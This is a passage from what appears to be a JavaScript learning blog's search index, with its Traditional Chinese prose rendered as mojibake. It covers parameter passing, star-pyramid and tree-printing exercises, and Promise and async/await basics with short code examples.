å‚³éåƒæ•¸çš„æ©Ÿåˆ¶","text":"ä¸€å€‹æœ‰é»è¤‡é›œçš„æ±è¥¿ã€‚ å› ç‚ºé€™å€‹å…¶å¯¦è »è¤‡é›œçš„ï¼Œæ‰€ä»¥é€™è£¡å¸Œæœ›ä½ ç†è§£å…©ä»¶äº‹å°±å¥½ï¼š åœ¨ function ä¸­ä¿®æ”¹å¼•æ•¸çš„å€¼æœƒä¸æœƒå½±éŸ¿åˆ°å¤–é¢çš„è®Šæ•¸ï¼Ÿ JavaScript ä¸­åªæœ‰ pass by value æˆ– pass by sharingï¼ˆåš´æ ¼ä¾†èªªæ˜¯å±¬æ–¼ pass by value çš„åº•ä¸‹ä¹‹ä¸€ï¼‰ ä¿®æ”¹å¼•æ•¸çš„å€¼æœƒä¸æœƒå½±éŸ¿åˆ°å¤–é¢çš„è®Šæ•¸ï¼Ÿå…ˆä¾†çœ‹å€‹ä¾‹å­ï¼š 12345678910111213function swap(a, b) { var temp = a a = b b = temp console.log(a, b)}var numberA = 10var numberB = 20console.log(numberA, numberB) // 10, 20swap(numberA, numberB) // 20, 10console.log(numberA, numberB) // 10, 20 é€™è£¡å˜—è©¦åœ¨ swap ä¸­æŠŠå…©å€‹å¼•æ•¸çš„å€¼çµ¦äº¤æ›ï¼Œä½†é¡¯ç„¶ä¸¦ä¸æœƒå½±éŸ¿åˆ°å¤–é¢çš„è®Šæ•¸ï¼ˆnumberAï¼ŒnumberBï¼‰ ä¹Ÿå°±æ˜¯èªªå¯ä»¥æŠŠ function æƒ³æˆæ˜¯é€™æ¨£å­è™•ç†å¼•æ•¸çš„ï¼š 12345678function swap(a, b) { var a = numberA // 10 var b = numberB // 20 var temp = a a = b b = temp console.log(a, b)} æœ‰é»é¡ä¼¼æ–¼æŠŠ numberA çš„ã€Œå€¼ã€æ‹·è²çµ¦ aï¼ŒnumberB çš„ã€Œå€¼ã€æ‹·è²çµ¦ bã€‚ ä¸çŸ¥é“ä½ é‚„è¨˜å¾—åœ¨ å¾ Object çš„ç­‰è™Ÿä¾†çœŸæ­£ç†è§£è®Šæ•¸ æåˆ°çš„è®Šæ•¸å„²å­˜æ–¹å¼å—ï¼Ÿæ­¤æ™‚ numberA å„²å­˜çš„æ˜¯ã€Œ10ã€é€™å€‹å€¼ï¼Œæ‰€ä»¥ a = numberA åªæ˜¯æŠŠ 10 é€™å€‹æ•¸å­—çµ¦ a è€Œå·²ï¼Œä¸ç®¡æˆ‘å€‘å° a åšä»€éº¼ï¼Œå®ƒéƒ½ä¸æ‡‰è©²å½±éŸ¿åˆ° numberAã€‚ å¥½ï¼Œç¾åœ¨æˆ‘å€‘å†çœ‹ä¸€å€‹ä¾‹å­ï¼š 1234567891011121314function add(obj) { obj.number++ obj.newValue = 'Boom!' return 1}var myObj = { number: 10}console.log(myObj.number) // 10add(myObj)console.log(myObj.number) // 11console.log(myObj) // {number: 11, newValue: 'Boom!'} æŒ‰ç…§å‰é¢çš„æ€ç¶­ï¼Œé€™æ¨£å­çš„çµæœæ˜¯åˆç†çš„ï¼Œå› ç‚ºç•¶è®Šæ•¸å„²å­˜çš„æ˜¯ç‰©ä»¶æ™‚ï¼Œé€™å€‹è®Šæ•¸å„²å­˜çš„å€¼æœƒæ˜¯ä¸€å€‹ã€Œè¨˜æ†¶é«”ä½å€ã€ï¼Œæ‰€ä»¥æ­¤æ™‚çš„ function æ˜¯é€™æ¨£å­åšè™•ç†ï¼š 123456function add(obj) { var obj = myObj // 0x01 obj.number++ obj.newValue = 'Boom!' return 1} å› ç‚º obj è·Ÿ myObj å„²å­˜çš„éƒ½æ˜¯åŒä¸€å€‹è¨˜æ†¶é«”ä½å€ï¼Œæ‰€ä»¥ç•¶ obj å»åšä¿®æ”¹æˆ–æ–°å¢çš„æ™‚å€™ï¼Œä¹Ÿå¾ˆåˆç†çš„æœƒæ”¹åˆ° myObjï¼Œç•¢ç«Ÿã€Œæ”¹çš„éƒ½æ˜¯åŒä¸€å€‹è¨˜æ†¶é«”ä½å€è£¡çš„æ±è¥¿ã€ã€‚ å¿˜è¨˜çš„è©±å†è¤‡ç¿’ä¸€ä¸‹é€™å¼µåœ–ï¼š å†ä¾†æ˜¯æœ€å¾Œä¸€å€‹ä¾‹å­ï¼š 123456789101112function add(obj) { obj = { number: 50 } return 1}var myObj = { number: 10}console.log(myObj) // {number: 10}add(myObj)console.log(myObj) // {number: 10} ç”¨ä½ åŸæœ¬çš„æ–¹å¼æ€è€ƒå°±å¥½ï¼Œåœ¨åŸ·è¡Œåˆ° obj = {number: 50} ä¹‹å‰ï¼Œå…¶å¯¦éƒ½è·Ÿå‰›å‰›çš„æƒ…æ³æ˜¯ä¸€æ¨£çš„ï¼š 1234567function add(obj) { var obj = myObj // 0x01 obj = { number: 50 } // 0x02 return 1} åœ¨ obj = {number: 50} ä¹‹å¾Œï¼Œobj å°±å·²ç¶“è¢«è³¦äºˆä¸€å€‹æ–°çš„è¨˜æ†¶é«”ä½å€ï¼Œå·²ç¶“è·ŸåŸæœ¬çš„ myObj æŒ‡å‘ä¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥åœ¨ä¹‹å¾Œä¸ç®¡ä½ å° obj åšä»€éº¼ï¼Œéƒ½ä¸æœƒå½±éŸ¿åˆ°å¤–é¢çš„ myObjã€‚ å¿˜è¨˜çš„è©±å†è¤‡ç¿’ä¸€ä¸‹é€™å¼µåœ–ï¼š pass by value ? pass by sharingæ¥ä¸‹ä¾†è¦ä¾†è§£é‡‹æœ€é–‹å§‹æåˆ°çš„ç¬¬äºŒä»¶äº‹ï¼šJavaScript ä¸­åªæœ‰ pass by value æˆ– pass by sharingã€‚ åœ¨è®Šæ•¸å„²å­˜çš„æ˜¯ã€Œéç‰©ä»¶ã€çš„è³‡æ–™å‹æ…‹æ™‚ï¼ˆstring, number, booleanï¼‰ï¼Œåœ¨ function ä¸­ä¿®æ”¹å¼•æ•¸çš„å€¼ä¸æœƒå½±éŸ¿åˆ°å¤–é¢çš„å€¼ï¼Œé€™ç¨®è¡Œç‚ºæˆ‘å€‘ç¨±ç‚ºã€Œpass by valueã€ã€‚ åœ¨è®Šæ•¸å„²å­˜çš„æ˜¯ã€Œç‰©ä»¶ã€çš„è³‡æ–™å‹æ…‹æ™‚ï¼ˆobject, arrayï¼‰ï¼Œåœ¨ function ä¸­ä¿®æ”¹å¼•æ•¸çš„å€¼ä¸æœƒå½±éŸ¿åˆ°å¤–é¢çš„å€¼ï¼Œé€™ç¨®è¡Œç‚ºæˆ‘å€‘ç¨±ç‚ºã€Œpass by sharingã€ã€‚ è‡³æ–¼ç‚ºä»€éº¼ç¨±ç‚º pass by sharing è€Œä¸æ˜¯ pass by referenceï¼Ÿ æ ¹æ“šæˆ‘åœ¨ç¶²è·¯ä¸Šæ‰¾çš„è³‡æ–™ï¼Œpass by reference çš„å®šç¾©æ˜¯é‡æ–°è³¦å€¼æ™‚ä¹Ÿæœƒå½±éŸ¿åˆ°åŸæœ¬çš„è®Šæ•¸ã€‚æ„æ€æ˜¯èªªåƒå‰›å‰› obj = {number: 50} é€™å€‹å‹•ä½œåŸ·è¡Œå¾Œ myObj ä¹Ÿæœƒè®Šæˆ {number: 50}ã€‚ ä¸æ‡‚ pass by reference è·Ÿ pass by sharing çš„å·®ç•°å¯ä»¥åƒè€ƒé€™å¼µåœ–ï¼š æ—¢ç„¶ä¸æ˜¯ pass by referenceï¼Œé‚£è©²å«ä»€éº¼ï¼Ÿå°±å«ã€Œpass by sharingã€å§ï¼å¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯ä¸€ç¨®ç´„å®šä¿—æˆã€‚ ä¸éå¦‚æœä½ æ›å€‹è§’åº¦ä¾†æ€è€ƒçš„è©±ï¼ŒæŸç¨®æ„ç¾©ä¸Š pass by sharing ä¹Ÿå¯ä»¥çœ‹åšæ˜¯ä¸€ç¨® pass by valueï¼š call by sharingï¼ˆå‚³è¨˜æ†¶é«”ä½ç½®é€²å»ï¼‰å…¶å¯¦å°±æ˜¯ call by value çš„ä¸€ç¨®ï¼Œè§£é‡‹çš„æ–¹å¼ç‚ºï¼šå…¶å¯¦ä¸€æ¨£æ˜¯å‚³å€¼çš„æ‹·è²é€²å»ï¼Œåªæ˜¯é€™å€‹å€¼æ˜¯è¨˜æ†¶é«”ä½ç½®ã€‚ ä½†ç¸½è€Œè¨€ä¹‹ï¼Œæˆ‘å€‹äººé‚„æ˜¯è¦ºå¾—åˆ†æˆ pass by value è·Ÿ pass by sharing çš„æ–¹å¼æ¯”è¼ƒå¥½ç†è§£ã€‚ ç¸½çµæœ€å¾Œåšå€‹ç¸½çµï¼š å‚³å…¥ function çš„è®Šæ•¸æ˜¯ã€Œéç‰©ä»¶ã€å‹æ…‹ï¼Œåœ¨ function åšä»»ä½•ä¿®æ”¹éƒ½ä¸æœƒå½±éŸ¿åˆ°åŸæœ¬çš„è®Šæ•¸å€¼ã€‚ å‚³å…¥ function çš„è®Šæ•¸æ˜¯ object ï¼Œåœ¨ function è£¡åšä¿®æ”¹æœƒå½±éŸ¿åˆ°åŸæœ¬çš„è®Šæ•¸å€¼ï¼Œä½†é‡æ–°è³¦å€¼ä¸æœƒã€‚ å¦å¤–æƒ³å¼•ç”¨ä¸€ä¸‹ Huli çš„è©±ï¼š ææ¸…æ¥šåˆ°åº•åƒæ•¸åœ¨æ“ä½œçš„æ™‚å€™æœƒæœ‰æ€æ¨£çš„è¡Œç‚ºã€‚ä½ è¦çŸ¥é“ JavaScript å‚³ object é€²å»çš„æ™‚å€™ï¼Œå¯ä»¥æ›´æ”¹åŸæœ¬ç‰©ä»¶çš„å€¼ï¼Œä½†é‡æ–°è³¦å€¼ä¸¦ä¸æœƒå½±éŸ¿åˆ°å¤–éƒ¨çš„ objectã€‚åªè¦çŸ¥é“é€™ä¸€é»ï¼Œå…¶ä»–çš„æˆ‘è¦ºå¾—éƒ½æ²’é‚£éº¼é‡è¦äº†ã€‚ å…¶å¯¦é€™å€‹å•é¡Œå¥½åƒä¸€ç›´éƒ½æ²’æœ‰æœ€æ­£ç¢ºçš„è§£é‡‹ï¼Œä½†ç¸½è€Œè¨€ä¹‹ï¼Œæˆ‘å€‘å…¶å¯¦æƒ³ææ‡‚çš„æ˜¯ã€Œå‡½å¼æ€éº¼æ“ä½œå¼•æ•¸ã€é€™ä»¶äº‹ï¼ŒçŸ¥é“é€™æ¨£å°±å¤ äº†ã€‚ åƒè€ƒè³‡æºæ·±å…¥æ¢è¨ JavaScript ä¸­çš„åƒæ•¸å‚³éï¼šcall by value é‚„æ˜¯ referenceï¼Ÿ","link":"/2021/12/18/principle-of-parameter/"},{"title":"å°å‡ºæ˜Ÿæ˜Ÿï¼ˆé‡‘å­—å¡”ï¼‰","text":"é€™æ˜¯ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œå› ç‚ºæˆ‘å±…ç„¶æ„Ÿåˆ°å›°æƒ‘ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ æ‰¾å‡ºè¦å¾‹é€™ä¸€é¡Œå…¶å¯¦å°±é›£åœ¨æ‰¾è¦å¾‹ï¼Œè¦å¾‹å¦‚æœæ‰¾ä¸å‡ºä¾†ï¼Œå°±æœƒæƒ³ä¸å‡ºè§£æ³•ã€‚ å…ˆè©¦è‘—è§€å¯Ÿçœ‹çœ‹ï¼š 123 * ******** è¦æ‰¾å‡ºçš„è¦å¾‹æ˜¯ã€Œæ¯è¡Œæœ‰å¹¾å€‹æ˜Ÿæ˜Ÿã€è·Ÿã€Œæ¯è¡Œæœ‰å¹¾å€‹ç©ºæ ¼ã€ã€‚ å…ˆçœ‹ç©ºæ ¼çš„éƒ¨åˆ†ï¼š ç¬¬ä¸€è¡Œæœ‰ 2 å€‹ç©ºç™½ ç¬¬äºŒè¡Œæœ‰ 1 å€‹ç©ºç™½ ç¬¬ä¸‰è¡Œæœ‰ 0 å€‹ç©ºç™½ é€™è£¡å‡è¨­ n = å…¨éƒ¨æœ‰å¹¾è¡Œï¼Œi = ç›®å‰çš„è¡Œæ•¸ï¼Œæ›å¥è©±èªªå°±æ˜¯æœ€å¤–å±¤è¿´åœˆçš„æ¬¡æ•¸ï¼š 123for(let i=1; i&lt;=n; i++) { ...} ä»”ç´°è§€å¯Ÿä¸€ä¸‹å¯ä»¥çœ‹å‡ºç©ºç™½çš„æ•¸é‡è·Ÿ n é‚„æœ‰ i æœ‰é—œï¼Œä¹Ÿå°±æ˜¯ n-i = é‚£ä¸€è¡Œéœ€è¦çš„ç©ºæ ¼æ•¸ï¼š ç¬¬ä¸€è¡Œæœ‰ 3-1 å€‹ç©ºç™½ ç¬¬äºŒè¡Œæœ‰ 3-2 å€‹ç©ºç™½ ç¬¬ä¸‰è¡Œæœ‰ 3-3 å€‹ç©ºç™½ æ‰€ä»¥ç©ºæ ¼çš„éƒ¨åˆ†å¯ä»¥é€™æ¨£è™•ç†ï¼š 123for(let i=1; i&lt;=n; i++) { repeat(' ', n-i)} æ¥è‘—ä¾†çœ‹æ˜Ÿæ˜Ÿçš„éƒ¨åˆ†ï¼š ç¬¬ä¸€è¡Œæœ‰ 1 å€‹æ˜Ÿæ˜Ÿ ç¬¬äºŒè¡Œæœ‰ 3 å€‹æ˜Ÿæ˜Ÿ ç¬¬ä¸‰è¡Œæœ‰ 5 å€‹æ˜Ÿæ˜Ÿ é€™è£¡ä¹Ÿæ˜¯æˆ‘å¡ä½çš„åœ°æ–¹ï¼Œå› ç‚ºæˆ‘æ²’è¾¦æ³•å¾ n è·Ÿ i ä¹‹é–“æ‰¾å‡ºé€™å€‹è¦å¾‹ï¼Œä¹Ÿä¸çŸ¥é“è©²å¾å“ªè£¡æ€è€ƒï¼Œ ä¸éå¾Œä¾†æƒ³æƒ³å…¶å¯¦å¯ä»¥ç”¨ã€Œæ•¸å­¸å‡½æ•¸ã€çš„æ–¹å¼ä¾†æ€è€ƒï¼Œä¾‹å¦‚ï¼š f(i) = å° i åšæŸå€‹ç®—å¼ = è¼¸å‡ºå€¼ f(1) = 1 f(2) = 3 f(3) = 5 å¾é€™è£¡å¯ä»¥ç™¼ç¾è¦å¾‹æ˜¯ ã€Œæ¯ä¸€åœˆéƒ½æœƒå¢åŠ  2ã€ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œæ¯ä¸€åœˆéƒ½è¦ x2ï¼š 1234f(i) = i * 2f(1) = 2f(2) = 4f(3) = 6 åšåˆ°é€™è£¡å¾Œæ‡‰è©²ä¸é›£ç™¼ç¾ï¼Œåªè¦å†æŠŠæ¯ä¸€é … -1ï¼Œå°±èƒ½é”æˆç›®æ¨™ï¼š 1234f(i) = i * 2 - 1f(1) = 1f(2) = 3f(3) = 5 æ‰€ä»¥æœ€å¾Œ 2i-1 å¯ä»¥å®Œæˆé€™å€‹å‡½æ•¸ï¼Œè¦å¾‹å°±æ‰¾å‡ºä¾†äº†ï¼š 123for(let i=1; i&lt;=n; i++) { repeat('*', i*2-1)} æœ€å¾ŒæŠŠæ•´å€‹ç¨‹å¼çµ„åˆä¸€ä¸‹ï¼š 123for(let i=1; i&lt;=n; i++) { console.log(repeat(' ', n-i) + repeat('*', i*2-1))} é€™æ¨£å°±è§£å®Œé€™é¡Œäº†ã€‚ æœ€å¾Œå†è€ƒä½ ä¸€é¡Œï¼š 123f(1) = 0f(2) = 2f(3) = 4 æƒ³å®Œå†ä¾†çœ‹è§£ç­” ç­”æ¡ˆæ˜¯ï¼šf(i) = 2i - 2 ç´€éŒ„é™„ä¸ŠåŸå§‹ç¨‹å¼ç¢¼ï¼ŒåŸæœ¬çš„æƒ³æ³•æ˜¯ã€Œå»ºç«‹ä¸€å€‹å¥‡æ•¸é™£åˆ—ä¾†åš mappingã€ï¼š ç¬¬ 1 è¡Œæœƒåœ¨ createStarts() ä»£å…¥ 1ï¼Œç”¢å‡º 1 å€‹æ˜Ÿæ˜Ÿ ç¬¬ 2 è¡Œæœƒåœ¨ createStarts() ä»£å…¥ 3ï¼Œç”¢å‡º 3 å€‹æ˜Ÿæ˜Ÿ ç¬¬ 3 è¡Œæœƒåœ¨ createStarts() ä»£å…¥ 5ï¼Œç”¢å‡º 5 å€‹æ˜Ÿæ˜Ÿ ä»¥æ­¤é¡æ¨ 12345678910111213141516171819202122232425262728293031323334353637function solve(lines) { // ç¸½å…±æœ‰å¹¾è¡Œ let n = Number(lines[0]) // ç”¨ä¾†å„²å­˜å¥‡æ•¸çš„é™£åˆ— let arr = [] // å»ºç«‹é™£åˆ—ï¼ˆè¼¸å…¥ç¯„åœæ˜¯ 1 ~ 30ï¼Œæ‰€ä»¥ç¬¬ 30 è¡Œæœƒæœ‰ 59 é¡†æ˜Ÿæ˜Ÿï¼‰ for(let i=1; i&lt;=60; i++) { // åªå„²å­˜å¥‡æ•¸ if(i&amp;1) arr.push(i) } // å°å‡º 1 ~ n è¡Œ for(let i=1; i&lt;=n; i++) { // å„²å­˜æœ€å¾Œè¦å°å‡ºçš„å…§å®¹ let content = '' // é™£åˆ—å¾ 0 é–‹å§‹ï¼Œæ‰€ä»¥æ‰å¾— arr[i-1] content = createWhiteSpace(n-i) + createStarts(arr[i-1]) console.log(content) }}// ç¬¬ i è¡Œæœƒæœ‰ n-i å€‹ç©ºç™½function createWhiteSpace (n) { let result = '' for(let i=0; i&lt;n; i++) { result += ' ' } return result}// ä¾ç…§ 1, 3, 5 çš„é †åºå°å‡ºæ˜Ÿæ˜Ÿfunction createStarts (n) { let result = '' for(let i=0; i&lt;n; i++) { result += '*' } return result}","link":"/2021/12/23/print-stars/"},{"title":"å°å‡ºè–èª•æ¨¹","text":"ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œé‚„æ˜¯æœ‰ä¸å¤ªç†Ÿæ‚‰ï¼Œæ‰€ä»¥åœ¨ç·´ç¿’ä¸€æ¬¡ã€‚ è§£é¡Œæ€ç¶­é€™ä¸€é¡Œå¯ä»¥å…ˆæ‹†æˆå…©å€‹éƒ¨åˆ†ï¼š æ˜Ÿæ˜Ÿçš„ç¸½è¡Œæ•¸ æœ¨æ£’çš„ç¸½è¡Œæ•¸ æ˜Ÿæ˜Ÿç¸½å…±æœƒæœ‰ n è¡Œï¼Œæ‰€ä»¥è¿´åœˆæœƒå¯«æˆï¼š ï¼ˆi å¾ 1 é–‹å§‹æ˜¯å› ç‚ºå‡½å¼çš„åƒæ•¸éœ€è¦ï¼Œå¦‚æœå¾ 0 é–‹å§‹çš„è©±æœƒä¸å¤ªæ–¹ä¾¿ï¼‰ 123for(let i=1; i&lt;=n; i++) { console.log('*', i)} æœ¨æ£’ç¸½å…±æœƒæœ‰ n-1 è¡Œï¼Œæ‰€ä»¥è¿´åœˆæœƒå¯«æˆï¼š ï¼ˆä¸€æ¨£éœ€è¦å‚³éå¼•æ•¸ï¼Œæ‰€ä»¥ i å¾ 1 é–‹å§‹ï¼‰ 123for(let i=1; i&lt;=n-1; i++) { console.log('|', i)} é€™æ¨£å°±å®Œæˆäº†åŸºæœ¬æ¶æ§‹ï¼š solve(['2'])ï¼š 123**| solve(['3'])ï¼š 1234***| æ¥è‘—å†ä¾†è™•ç†ã€Œæ¯è¡Œçš„æ˜Ÿæ˜Ÿã€è·Ÿã€Œæ¯è¡Œçš„æœ¨æ£’ã€å°±å¤§åŠŸå‘Šæˆäº†ã€‚ æ¯è¡Œçš„æ˜Ÿæ˜Ÿæ•¸é‡è¦å¾‹ç‚º 2i-1ï¼Œæ˜Ÿæ˜Ÿçš„ç©ºæ ¼ç‚º n-i æ¯è¡Œçš„æœ¨æ£’æ•¸é‡å›ºå®šï¼Œæœ¨æ£’çš„ç©ºæ ¼è¦å¾‹ç‚º n-1 æ‰€ä»¥æŠŠå‰é¢å¯«å¥½çš„éƒ¨åˆ†ç¨å¾®æ”¹å¯«ä¸€ä¸‹ï¼š 1234567// æ˜Ÿæ˜Ÿfor(let i=1; i&lt;=n; i++) { console.log(repeat(' ', n-i) + repeat('*', 2*i-1))}for(let i=1; i&lt;=n-1; i++) { console.log(repeat(' ', n-1) + '|')} é€™æ¨£å°±å¤§åŠŸå‘Šæˆï¼ solve(['3'])ï¼š 12345 * ******** | |","link":"/2021/12/26/print-tree/"},{"title":"ç”¨ Promise ä¾†åŒ…è£ XMLHttpRequest","text":"æ‡¶äººä¸€ä¸‹ã€‚ ç°¡è¿°æ¯”è¼ƒç†Ÿæ‚‰å¾Œå°±å¯ä»¥æŠŠä¸€äº›æ±è¥¿æ”¹ç”¨ Promise ä¾†åŒ…è£ï¼Œä¾‹å¦‚ï¼šXMLHttpRequest 123456789101112131415function sendRequest () { return new Promise((resolve, reject) =&gt; { const request = new XMLHttpRequest(); request.open('GET', api200, true); // æˆåŠŸå°± call resove request.onload = () =&gt; resolve(JSON.parse(request.responseText)); // å¤±æ•—å°± call reject request.onerror = () =&gt; reject('ç™¼ç”Ÿæœªé æœŸçš„éŒ¯èª¤ï¼'); request.send(); })}sendRequest() .then(res =&gt; console.log(res)) .catch(err =&gt; console.log(err))","link":"/2022/03/03/promise-and-xhr/"},{"title":"è‡ªå·±æä¸€å€‹ Promise","text":"è‡ªå·±ææ¯”è¼ƒå¥½æ‡‚ã€‚ ç°¡è¿°ç›´æ¥çœ‹ä¾‹å­ï¼š 123456789const mySuccessPromise = new Promise((resolve, reject) =&gt; { resolve('Ya!!!!');});const myFailedPromise = new Promise((resolve, reject) =&gt; { reject('No~~~~')})mySuccessPromise.then(data =&gt; console.log('data =', data));myFailedPromise.catch(data =&gt; console.log('data =', data)); å°±è·Ÿåœ¨ fetch è£¡è¬›çš„ä¸€æ¨£ï¼Œresolve ä»£è¡¨æˆåŠŸï¼Œæ‰€ä»¥ç”¨ then ä¾†æ‹¿åˆ°æˆ‘å€‘åœ¨ Promise è£¡é¢å¯«çš„å…§å®¹ï¼›è€Œ reject ä»£è¡¨å¤±æ•—ï¼Œæ‰€ä»¥ç”¨ catch ä¾†æ‹¿åˆ°å…§å®¹ã€‚ ç•¶ç„¶ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å›å‚³ Promise çš„æ–¹å¼ä¾†å¯«åœ¨ä¸€èµ·ï¼š 123456789101112131415const mySuccessPromise = new Promise((resolve, reject) =&gt; { resolve('Ya!!!!');});const myFailedPromise = new Promise((resolve, reject) =&gt; { reject('No~~~~')})mySuccessPromise .then(data =&gt; { console.log('data =', data); return myFailedPromise; }) .catch(data =&gt; { console.log('data =', data); });","link":"/2022/03/03/promise-create/"},{"title":"Promise æœ€å¤§çš„ç”¨é€”ï¼Ÿ","text":"æœ€éº»ç…©çš„éåŒæ­¥ã€‚ ç°¡è¿°æˆ‘æƒ³å®ƒæœ€å¤§çš„ç”¨é€”æ˜¯ç”¨ä¾†è™•è£¡ã€ŒéåŒæ­¥ã€çš„è¡Œç‚ºã€‚ èˆ‰å€‹ä¾‹å­ï¼š 1234567const sleep = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { resolve('æˆ‘ç¡é£½äº†'); }, 1000)});// ä¸€ç§’å¾Œå°å‡º 'æˆ‘ç¡é£½äº†'sleep.then(end =&gt; console.log(end)); ç°¡å–®ä¾†èªªï¼Œä¸ç®¡ä½ åœ¨ Promise è£¡é¢åšä»€éº¼éåŒæ­¥æ“ä½œï¼Œthen éƒ½æœƒç­‰åˆ° resolve è¢« trigger æ‰æœƒåŸ·è¡Œã€‚ å†ä¾†çœ‹å€‹ä¾‹å­ï¼š 12345678910111213function sleep (ms) { return new Promise(resolve =&gt; { setTimeout(resolve, ms) })}sleep(1000) .then(first =&gt; { console.log('1 ç§’éäº†ï¼Œ', first) return sleep(1000) }) .then(second =&gt; { console.log('åˆ 1 ç§’éäº†ï¼Œ', second) }) é€™é‚Šåªæ˜¯æƒ³ç¢ºèªä½ çŸ¥é“æµç¨‹æ˜¯ä»€éº¼ï¼š sleep(1000) æœƒå›å‚³ä¸€å€‹ Promiseï¼Œè€Œé€™å€‹ Promise æœƒåœ¨ä¸€ç§’å¾Œå‘¼å« resolveï¼Œå› æ­¤ç¬¬ä¸€å€‹ then å°±æœƒåœ¨ä¸€ç§’ä¹‹å¾Œè¢«åŸ·è¡Œã€‚ æ¥è‘—ï¼Œthen è£¡åˆå›å‚³äº† sleep(1000)ï¼Œç­‰æ–¼åˆå›å‚³äº†ä¸€å€‹ Promiseï¼Œæ‰€ä»¥ä¸€ç§’å¾Œ Promise åˆå‘¼å« resolveï¼ŒåŸ·è¡Œäº†ä¸‹ä¸€å€‹ thenã€‚ å¦å¤–ï¼Œå› ç‚º resolve ä¸¦æ²’æœ‰å‚³å…¥ä»»ä½•å€¼ï¼Œæ‰€ä»¥å…©å€‹ then éƒ½åªæœƒæ‹¿åˆ° undefinedã€‚","link":"/2022/03/03/promise-purpose/"},{"title":"Promise çš„å°æŠ€å·§","text":"åœ¨å·´å“ˆå§†ç‰¹ä¸Šå­¸åˆ°çš„ã€‚ åŸç†ç°¡è¿°å…¶å¯¦åŸç†æ‡‰è©²å°±æ˜¯ async await çš„èªæ³•ï¼Œåªè¦å»ºç«‹ä¸€å€‹ Promise å°±å¯ä»¥ç”¨ await ä¾†å¼·åˆ¶ç­‰ Promise åŸ·è¡Œå®Œæ‰åŸ·è¡Œå¾Œé¢çš„ç¨‹å¼ç¢¼ï¼Œæ›å¥è©±èªªå°±æ˜¯å¼·åˆ¶æŠŠã€ŒéåŒæ­¥ -&gt; åŒæ­¥ã€çš„æ„Ÿè¦ºå§ï¼Ÿ é€™ä¸€å¡Šæˆ‘é‚„æ²’å­¸åˆ°ï¼Œæ‰€ä»¥åªæ˜¯æˆ‘å¤§æ¦‚ççŒœçš„ï¼Œä½†æ²’é—œä¿‚å°±å…ˆè¨˜ä¸‹ä¾†å§ï¼ å‚™è¨»ï¼šawait å¿…é ˆåŒ…åœ¨ async é–‹é ­çš„ function è£¡é¢æ‰èƒ½ç”¨ï¼Œæ„æ€å°±æ˜¯ã€Œé€™å€‹ function è£¡æœ‰éåŒæ­¥ function çš„æ„æ€å§ï¼ã€ã€‚ å‚™è¨»ï¼šawait å¾Œé¢åªè¦æ¥ Promiseï¼Œå°±æœƒç­‰é€™å€‹ Promise åŸ·è¡Œ resolve æˆ– reject å®Œæ‰æœƒå¾€ä¸‹åŸ·è¡Œã€‚ å‚™è¨»ï¼šæˆ‘å¾ˆå¸¸æœƒæŠŠ resolve æ”¾éŒ¯åœ°æ–¹ã€‚è¨˜ä½ä¸€å€‹è¦è¨£ï¼šresolve ä¸€å®šè¦æ”¾åœ¨éåŒæ­¥åŸ·è¡Œå®Œçš„é‚£å€‹ã€Œ callbackã€è£¡é¢å‘¼å«ï¼Œé€™æ¨£å­æ‰æœƒç­‰éåŒæ­¥åŸ·è¡Œå¾Œå†å¾€ä¸‹è·‘ã€‚ è£œå……ï¼async ä¸æ˜¯ä½ æƒ³çš„é‚£æ¨£æ³¨æ„ async æŒ‡çš„æ˜¯ã€Œè£¡é¢ã€æœ‰éåŒæ­¥ functionï¼Œä¸æ˜¯ã€Œfunction è‡ªå·±ã€æ˜¯éåŒæ­¥å‡½å¼ï¼ŒæŠŠä¸‹é¢å…©æ®µæ‹¿å»è·‘ä½ å°±æ‡‚äº†ã€‚ ä¸æ˜¯éåŒæ­¥ï¼š 123456789async function fakeAsync() { console.log('fake asnyc!!!')}for(let i=0; i&lt;=100; i++) { // å¦‚æœé€™å€‹çœŸçš„æ˜¯éåŒæ­¥ fakeAsync() // é‚£é€™è¡Œå°±æ‡‰è©²è¦æ¯”ä¸Šé¢çš„å…ˆåŸ·è¡Œ console.log('sync!! \\n')} æ˜¯éåŒæ­¥ï¼š 123456789async function asyncFunction() { console.log('asnyc!!!')}for(let i=0; i&lt;=100; i++) { // ç”¨ setTimeout è®ŠéåŒæ­¥ setTimeout(asyncFunction, 0) // æ‰€ä»¥é€™è¡Œæœƒå…ˆåŸ·è¡Œ console.log('sync!! \\n')} ç¯„ä¾‹ä¸€ æ›´æ–°è®Šæ•¸çš„å€¼ä¸€èˆ¬çš„æƒ…æ³ï¼š 123456789~async function() { let a = 10 setTimeout(function() { a = 100 }, 1000) // ä¸Šé¢æ˜¯éåŒæ­¥ï¼Œä¸æœƒç­‰ä¸Šé¢åŸ·è¡Œå®Œæ‰åŸ·è¡Œ // æ‰€ä»¥ a = 10 console.log(a)}() åˆ©ç”¨ Promise + awaitï¼š 12345678910111213~async function() { let a = 10 // ç­‰ Promise åŸ·è¡Œå®Œæ‰åŸ·è¡Œå¾Œé¢çš„ç¨‹å¼ç¢¼ await new Promise((resolve, reject) =&gt; { setTimeout(function() { // æ›´æ–° a = 100 a = 100 // é€™åŸ·è¡Œå®Œå¾Œæ‰å¾€ä¸‹åŸ·è¡Œ resolve() }, 1000) }) console.log(a)}() ç¯„ä¾‹äºŒ è®“è¿´åœˆçš„é€Ÿåº¦è®Šæˆ LKKå¹´è¼•ç‰ˆï¼ˆéŒ¯èª¤ç¤ºç¯„ï¼‰ï¼š 12345678910~async function() { // é€™é‚Šæ•…æ„ç”¨ var ä¸ç”¨ let for (var i=1; i&lt;=5; i++) { // ç¶“å…¸çš„é–‰åŒ…é¡Œç›® // ä¸€ç§’å¾Œæœƒå°å‡º 5 å€‹ 6 setTimeout(function() { console.log(i) }, 1000) }}() è€å¹´ç‰ˆï¼š 123456789101112~async function() { for (let i=0; i&lt;=10; i++) { // æ¯ä¸€åœˆéƒ½è¦å…ˆç­‰ä¸€ç§’ await new Promise((resolve, reject) =&gt; { setTimeout(function() { resolve() }, 1000) }) // æ‰æœƒåŸ·è¡Œé€™è£¡ console.log(i) }}() ç¯„ä¾‹ä¸‰ ç™¼é€ 